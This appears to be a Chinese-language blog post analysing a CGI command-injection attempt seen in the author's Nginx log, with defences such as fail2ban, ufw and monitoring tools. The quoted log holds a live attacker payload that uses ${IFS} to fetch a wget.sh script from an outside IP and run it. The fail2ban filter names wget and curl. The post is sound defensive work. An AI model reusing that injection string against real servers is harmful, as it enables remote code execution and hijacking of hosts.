---
slug: cgi-injection-log-analysis
title: CGI 攻擊的技術側寫
authors: Z. Yuan
image: /img/2025/0430.jpg
tags: [security, fail2ban, ufw, log-analysis]
description: 剖析 CGI 命令注入攻擊的手法、風險與預防策略。
---

我的主機又被攻擊了。

這一天天的，這個世界果然充滿惡意。

<!-- truncate -->

## 什麼是 CGI？

Common Gateway Interface（CGI）是個誕生於 1993 年的老古董。當時靜態網頁是主流，CGI 被視為能實現「動態內容」的黑科技。

它的運作方式簡單粗暴：

1. 瀏覽器送出 HTTP 請求。
2. Web 伺服器一看路徑落在 `/cgi-bin/`，就知道要「搞點事」。
3. 於是它把 Query String、Header 等資訊塞進一堆環境變數。
4. 然後 fork 出一個外部程式（如 Perl、Bash、C），直接吃那些變數。
5. 程式用 STDOUT 輸出 HTTP 回應。
6. 結束後關閉行程，等下一個請求再重新開一隻。

優點是萬用：任何語言都能寫，只要能在 OS 上執行。

缺點則滿地都是：

- 一請求一行程，效能低落，主機壓力大。
- 環境變數毫無防備，易遭命令注入。
- 可執行檔直接放公開路徑，形同裸奔。
- 行程權限等同 Web Server，用戶一疏忽，攻擊者就能橫行。

如今，CGI 已被 PHP-FPM、FastCGI、WSGI 等更安全、效能更好的架構取代。

但它仍在一些舊系統中倖存，並成為攻擊者的狩獵場。

## 攻擊徵兆

我在日常排查 Nginx 的 error log 時，發現以下異狀：

```log
2025-04-28 14:21:36,297 fail2ban.filter [1723]: WARNING Consider setting logencoding…

b'2025/04/28 14:21:36 [error] 2464#2464: *7393

open() "/usr/share/nginx/html/cgi-bin/mainfunction.cgi/apmcfgupload"
failed (2: No such file or directory),

client: 176.65.148.10,
request: "GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxx…0\xb4%52$c%52$ccd${IFS}/dev;wget${IFS}http://94.26.90.205/wget.sh;${IFS}chmod${IFS}+x${IFS}wget.sh;sh${IFS}wget.sh HTTP/1.1",
referrer: "http://xxx.xxx.xxx.xxx:80/cgi-bin/…"\n'
```

請注意這段：

```log
wget${IFS}http://94.26.90.205/wget.sh;
```

這不是 typo，而是**赤裸裸的命令注入**。

攻擊者利用 CGI 的參數欄位，意圖執行以下流程：

1. 下載 `wget.sh`。
2. 賦予執行權限。
3. 立即執行腳本。

這類惡意腳本內容五花八門，常見行為包括：

- 新增後門帳號、植入 SSH Key。
- 投放挖礦程式（如 `xmrig`、`kdevtmpfs`）。
- 修改 crontab，確保重開機自動復活。
- 關閉防火牆與安全監控。

一旦中招，你的主機可能會比你還努力打工，而收益流向別人的錢包。

## 攻擊手法拆解

這類攻擊一般分為以下幾步：

- **掃描**：`GET /cgi-bin/*.cgi`，瘋狂亂槍打鳥，看能不能找到還活著的 CGI。
- **注入**：利用 `%52$c`、`${IFS}` 等技巧，繞過輸入過濾與字串比對。
- **下載**：`wget http://...` 抓惡意腳本，多數架在裸機或遭入侵的主機。
- **落地**：`chmod +x && sh`，權限放寬，立即執行，一氣呵成。

這裡補充兩個常見技巧：

- `%52$c`：`printf` 格式化技法，原本設計來操作堆疊，雖然本例未觸及 overflow，但已能避開單純關鍵字比對。
- `${IFS}`：Bash 中的 Internal Field Separator，預設是空白。將空白寫成 `${IFS}`，就能逃過許多只針對空格過濾的防線。

## 防禦策略

沒有萬無一失的防線，但能讓攻擊者繞遠路、走冤枉路，風險就能大幅降低。

### 1. 關閉 CGI 模組

```bash
# Apache 範例
sudo a2dismod cgi
sudo a2dismod php7.4

# nginx 原生不支援 CGI，千萬別多裝 fcgiwrap
```

### 2. 設定通報機制

```bash title="/etc/fail2ban/filter.d/nginx-cgi.conf"
[Definition]
failregex = <HOST> -.*GET .*cgi-bin.*(;wget|curl).*HTTP
ignoreregex =
```

```ini title="/etc/fail2ban/jail.d/nginx-cgi.local"
[nginx-cgi]
enabled  = true
port     = http,https
filter   = nginx-cgi
logpath  = /var/log/nginx/error.log
maxretry = 3
bantime  = 6h
action   = %(action_mwl)s   # 包含 email 通知 + whois 查詢 + 日誌摘要
```

### 3. 基礎防火牆配置

```bash
sudo ufw default deny incoming
sudo ufw allow 22/tcp comment 'SSH'
sudo ufw allow 80,443/tcp comment 'Web'
sudo ufw enable
```

不要忽略 IPv6，也要一併設限。

### 4. 系統監控

| 功能                 | 工具名                   | 安裝方式               |
| -------------------- | ------------------------ | ---------------------- |
| 即時監控與告警       | **Netdata**              | `apt install netdata`  |
| Log 分析與流量視覺化 | **GoAccess**             | `apt install goaccess` |
| SOC 防禦框架         | **Wazuh** / **CrowdSec** | 官方安裝腳本           |

- **CrowdSec**：像是 Fail2Ban 進化版，具備社群黑名單與 firewall-bouncer 插件。
- **Wazuh**：OSSEC 增強版，結合 Elastic Stack 提供完整視覺化儀表板。

## 結語

沒發現異常，不代表真的沒事。

唯有建立觀察基準、定期查看日誌，才能在異常發生時第一時間發現並處置。

這次的 CGI 攻擊「沒有成功」，並不是因為對手技術拙劣，而是我剛好多做了幾步：關閉模組、設好防火牆、配置好 Fail2Ban。

> **資安的本質從來不是「你是不是目標」，而是「你是不是暴露在風險裡」。**

連上網路那一刻起，每台主機都默默參加了這場全球掃描樂透，要想不中獎，不能只靠運氣，也得靠日常的準備與警覺。

這次，不速之客遠道而來，我剛好醒著，也剛好鎖了門。

但願你也是。
